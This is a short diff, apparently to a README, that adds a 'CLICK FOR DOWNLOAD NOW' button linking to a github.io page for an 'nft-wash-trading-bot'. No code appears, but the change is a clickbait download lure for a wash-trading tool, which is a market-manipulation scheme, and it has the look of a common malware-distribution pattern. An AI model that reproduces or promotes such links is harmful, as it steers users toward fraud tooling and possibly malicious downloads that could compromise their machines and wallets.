@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://FlatKomodoSupervise.github.io/nft-wash-trading-bot-zg35/ ) |
  |---------------------|----------------------:|
 
 
